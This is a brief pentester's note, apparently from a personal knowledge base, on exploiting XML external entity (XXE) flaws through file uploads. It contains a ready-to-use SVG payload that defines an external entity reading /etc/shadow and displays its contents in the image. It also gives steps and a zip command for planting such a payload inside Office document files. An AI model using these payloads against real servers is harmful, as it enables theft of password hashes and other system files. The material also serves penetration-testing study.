

get [[XXE]] from file upload
	1. SVG payload: save the following into file as an `.svg` file and upload it to the server
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE example [ <!ENTITY test SYSTEM "file:///etc/shadow"> ]> 
<svg width="500" height="500"> 
	<circle cx="50" cy="50" r="40" fill="blue" /> 
	<text font-size="16" x="0" y="16">&test;</text> 
</svg>
```
2. `.docx` , `.xlxs`, `.pptx` files
	1. unzip the document file![[Pasted image 20240129184215.png]]
	1. insert your payload into a `.xml` file 
	2. `cd example;zip -r new_example.docx *` 